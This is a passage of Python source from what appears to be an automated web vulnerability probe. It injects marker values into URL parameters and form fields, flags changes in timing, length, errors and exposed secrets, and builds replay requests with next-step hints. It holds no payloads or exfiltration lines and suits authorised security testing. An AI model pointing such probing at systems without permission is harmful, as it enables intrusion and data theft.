            "input": _target_brief(target),
            "value": value,
            "error": response.error,
            "elapsed_ms": response.elapsed_ms,
            "replay": _target_replay(target, value),
            "next": "This value changes execution time; rerun this exact template alone with a higher timeout before trying more values.",
        }
    delta = compare_responses(baseline, response, marker=value)
    if _value_gate_response_changed(baseline, response, value):
        return {
            "type": "reflection_value_expected_signal",
            "input": _target_brief(target),
            "value": value,
            "delta": delta.to_json(),
            "matches": matches,
            "response": response.summary(body_chars=640),
            "baseline_replay": _target_replay(target, _baseline_value(target)),
            "replay": _target_replay(target, value),
            "next": "The visible value gate changed for this exact input; preserve the template and continue proof closure from this branch.",
        }
    if _interesting_delta(delta.to_json(), baseline, response):
        return {
            "type": "reflection_value_delta",
            "input": _target_brief(target),
            "value": value,
            "delta": delta.to_json(),
            "matches": matches,
            "response": response.summary(body_chars=520),
            "baseline_replay": _target_replay(target, _baseline_value(target)),
            "replay": _target_replay(target, value),
            "next": "Keep this exact reflected-input template; inspect the changed branch before broad value loops.",
        }
    return {}


def _response_timed_out(response: ProbeResponse) -> bool:
    error = response.error.lower()
    return "timed out" in error or "timeout" in error


def _interesting_delta(
    delta: dict[str, object],
    baseline: ProbeResponse,
    response: ProbeResponse,
) -> bool:
    if delta.get("status_changed"):
        return True
    if abs(_int(delta.get("length_delta"))) >= 80:
        return True
    if _int(delta.get("elapsed_delta_ms")) >= 2500:
        return True
    if delta.get("new_error_markers"):
        return True
    return bool(response_secrets(response)) and response.body != baseline.body


def _value_gate_response_changed(baseline: ProbeResponse, response: ProbeResponse, value: str) -> bool:
    if not _has_value_gate_text(baseline.body):
        return False
    if response.body == baseline.body:
        return False
    lowered_response = html.unescape(response.body).lower()
    return value.lower() in lowered_response


def _has_terminal_finding(findings: list[dict[str, object]]) -> bool:
    if not findings:
        return False
    return str(findings[-1].get("type") or "") in {"reflection_value_proof", "reflection_value_timeout"}


def _prioritized_findings(findings: list[dict[str, object]]) -> list[dict[str, object]]:
    terminal_types = {"reflection_value_proof", "reflection_value_timeout"}
    terminal = [finding for finding in findings if finding.get("type") in terminal_types]
    non_terminal = [finding for finding in findings if finding.get("type") not in terminal_types]
    return terminal + non_terminal


def _baseline_value(target: dict[str, object]) -> str:
    input_name = str(target.get("input") or "")
    if input_name:
        return "ravage-baseline"
    return "ravage"


def _target_brief(target: dict[str, object]) -> dict[str, object]:
    return {
        "kind": target.get("kind"),
        "method": str(target.get("method") or "GET").upper(),
        "url": target.get("url"),
        "input": target.get("input"),
        "hints": _string_items(target.get("hints")),
    }


def _target_replay(target: dict[str, object], value: str) -> dict[str, object]:
    kind = str(target.get("kind") or "")
    url = str(target.get("url") or "")
    input_name = str(target.get("input") or "")
    raw_form = target.get("form")
    if kind == "form" and isinstance(raw_form, dict):
        form = dict(raw_form)
        fields = form_defaults(form, marker_name=input_name, marker=value)
        method = str(form.get("method") or "GET").upper()
        replay: dict[str, object] = {
            "method": method,
            "url": str(form.get("action") or url),
            "payload_field": input_name,
        }
        if method == "POST":
            replay["body"] = fields
        else:
            replay["query"] = fields
        return replay
    return {
        "method": "GET",
        "url": inject_query_param(url, input_name, value),
        "payload_field": input_name,
    }


def _list_of_dicts(value: object) -> list[dict[str, object]]:
    if not isinstance(value, list):
        return []
    items: list[dict[str, object]] = []
    for item in value:
        if isinstance(item, dict):
            items.append(dict(item))
    return items


def _int(value: object) -> int:
    if isinstance(value, int):
        return value
    if isinstance(value, float):
        return int(value)
    if isinstance(value, str) and value.strip():
        try:
            return int(value)
        except ValueError:
            return 0
    return 0
